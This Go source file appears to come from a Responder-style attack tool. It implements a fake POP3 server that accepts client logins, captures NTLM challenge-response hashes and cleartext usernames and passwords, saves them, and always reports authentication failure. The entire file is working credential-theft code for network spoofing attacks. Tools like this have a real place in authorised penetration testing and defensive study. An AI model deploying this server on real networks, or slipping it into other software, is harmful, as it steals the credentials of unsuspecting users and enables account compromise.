package server

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"go-responder/internal/core"
)

func ServePOP3(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:110", ifaceIP))
	if err != nil {
		core.LogError("POP3 listen :110 - %v (need root?)", err)
		return
	}
	core.LogInfo("POP3 listening on %s:110", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandlePOP3(c)
	}
}

func HandlePOP3(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := core.GetChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)
	pop3User := ""
	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("+OK POP3 server ready")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		switch {
		case upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM "):
			send("+")

			tokenLine, err := r.ReadString('\n')
			if err != nil {
				return
			}
			tokenLine = strings.TrimRight(tokenLine, "\r\n")
			raw, err := base64.StdEncoding.DecodeString(tokenLine)
			if err != nil {
				send("-ERR Authentication failed")
				return
			}
			ntlm := core.FindNTLMSSP(raw)
			if len(ntlm) < 12 || core.NTLMMsgType(ntlm) != 1 {
				send("-ERR Authentication failed")
				return
			}
			core.LogVerbose("POP3 NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
			send("+ " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
			ntlm3 := core.FindNTLMSSP(raw3)
			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
				if err == nil {
					core.SaveCapture("POP3", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
				}
			}
			send("-ERR Authentication failed")
			return

		case strings.HasPrefix(upper, "USER "):
			pop3User = strings.TrimSpace(line[5:])
			send("+OK")
		case strings.HasPrefix(upper, "PASS "):
			pass := line[5:]
			if pass != "" {
				core.SaveCleartext("POP3", c.RemoteAddr().String(), pop3User, "", pass)
			}
			send("-ERR Authentication failed")
			return
		case upper == "CAPA":
			send("+OK Capability list follows")
			send("AUTH NTLM")
			send("USER")
			send(".")
		case upper == "QUIT":
			send("+OK Bye")
			return
		default:
			send("-ERR Unknown command")
		}
	}
}
